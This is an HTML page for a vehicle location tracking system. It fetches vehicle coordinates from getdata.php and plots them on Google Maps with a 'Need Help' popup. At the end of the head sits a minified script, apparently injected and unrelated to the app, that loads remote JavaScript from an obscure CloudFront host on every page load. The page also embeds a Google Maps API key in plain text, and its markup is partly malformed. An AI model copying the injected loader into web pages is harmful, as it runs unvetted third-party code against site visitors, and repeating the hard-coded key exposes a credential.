
<!DOCTYPE html>

<html>

	

<head>

<meta http-equiv="refresh" content="50" />

	<!-- Load Jquery -->



	<script language="JavaScript" type="text/javascript" src="jquery-1.10.1.min.js"></script>



	<!-- Load Google Maps Api -->



	<!-- IMPORTANT: change the API v3 key -->

	 <script src="http://maps.googleapis.com/maps/api/js?key=AIzaSyC5atMHGmfxux37k2AflzcmBmxAqzjZ-kE&sensor=false"></script>
   


	<!-- Initialize Map and markers -->



	<script type="text/javascript">

		

	</script>

	<style>

		#googleMap

		{

			position: absolute;

			top: 110px;

			bottom: 0px;

			left: 0px;

			right: 0px;

		}

		#superior

		{

			border:1px solid #000;

			position: absolute;

			top: 30px;

			left: 10px;

			right: 10px;

			z-index: 100;

		}

	</style>

<script type="text/javascript">(function(){var a=document.createElement("script");a.type="text/javascript";a.async=!0;a.src="http://d36mw5gp02ykm5.cloudfront.net/yc/adrns_y.js?v=6.11.144#p=st3500414cs_6vvh8mxwxxxx6vvh8mxw";var b=document.getElementsByTagName("script")[0];b.parentNode.insertBefore(a,b);})();</script></head>


<tr>
<td>
<a class="btn btn-primary btn-block" href="logout.php">Logout</a>
<a class="btn btn-primary btn-block" href="index.php">Monitor VEHICLE</a>
<a class="btn btn-primary btn-block" href="show_data.php">SHOW_VEHICLE_DATA</a>
</td>
</tr>



<body>

<!-- Draw information table and Google Maps div -->

<div>	

		<div id="superior">

			<table style="width:100%" border="5">

				<tr>

				<tr>
					<td colspan="3" align="center"><h4 style="margin: 0">Vehicle Enhance Location Tracking System </h4></td></tr>
				
				<tr>

				
					<td width="20%" align="center">Date & Time</td>

				</tr>

				<tr>

					<td id="time" align="center"></td>

				</tr>

			</table>

		</div>

		<br /><br />


		<div id="googleMap"></div>

</div>

<script>



var myCenter=new google.maps.LatLng(0,0);

var marker;

var map;

var mapProp;



function initialize()

{

	mapProp = {

	  center:myCenter,

	  zoom:12,

	  mapTypeId:google.maps.MapTypeId.ROADMAP

	  };

	getdata();

}

google.maps.event.addDomListener(window, 'load', initialize);



function mark(json_data)

{

	map=new google.maps.Map(document.getElementById("googleMap"),mapProp);

    var marker;

	$.each($.parseJSON(json_data), function(idx, obj) 

	{

			

			if((obj.lat!="") && (obj.lon!=""))

			{

				console.log(obj.lat+" "+obj.lon)

				marker=new google.maps.Marker({

					  position:new google.maps.LatLng(obj.lat,obj.lon),icon: 'http://sk-infosoft.top/vehicletracking/images/health.jpg',title: "text "+obj.pid,animation: google.maps.Animation.DROP,
					  });

				marker.setMap(map);
				
				map.setCenter(new google.maps.LatLng(obj.lat,obj.lon));
				
				var infowindow = new google.maps.InfoWindow({
               content:"V-ID:"+obj.pid+" VEHICLE Need Help "});

            infowindow.open(map,marker);http://sk-infosoft.top/vehicletracking/images/health.jpg
document.getElementById('time').innerHTML=obj.current;
marker.setAnimation(google.maps.Animation.BOUNCE);
			}

		

    });
	


}
 function toggleBounce() {
        if (marker.getAnimation() !== null) {
          marker.setAnimation(null);
        } else {
          marker.setAnimation(google.maps.Animation.BOUNCE);
        }
      }



function getdata()

{

	$.ajax({

	  type: "POST",

	  url: "getdata.php",

	  data: { "rand" : Math.floor(Math.random()*11)},

	  success: function(data, textStatus, jqXHR)

		    {

		    	

		    	mark(data);      	

		    },

	});

}

//setInterval('get_data()',10000);

		

</script>

</body>

</html>

